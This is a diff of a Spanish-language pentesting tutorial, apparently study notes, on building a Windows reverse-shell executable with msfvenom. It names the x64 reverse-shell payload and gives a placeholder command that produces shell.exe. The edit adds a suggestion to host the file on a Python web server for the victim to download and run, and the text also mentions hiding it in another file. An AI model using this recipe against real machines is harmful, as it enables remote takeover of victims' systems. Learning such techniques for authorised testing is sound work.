@@ -74,7 +74,7 @@ windows/x64/shell_reverse/tcp                        Connect back to attacker an
 
 Si la máquina víctima es de `32 bits` usaremos el primero y si es de `64` usaremos el segundo.
 
-Con el siguiente comando creamos un `ejecutable` que si lo ejecutamos en la máquina víctima nos mandará una `reverse shell`. Claro, para eso tendremos que `ocultarlo` dentro de otro archivo, pero no me quiero extender mas aquí.
+Con el siguiente comando creamos un `ejecutable` que si lo ejecutamos en la máquina víctima nos mandará una `reverse shell`. Claro, para eso tendremos que `ocultarlo` dentro de otro archivo, o también podríamos ponerlo en un servidor web hecho con python y que la máquina víctima lo descargue y lo ejecute, pero no me quiero extender mas aquí.
 
 ```
 > msfvenom -p <payload> LHOST=<ip> LPORT=443 -a x<arquitectura> -f exe -o shell.exe
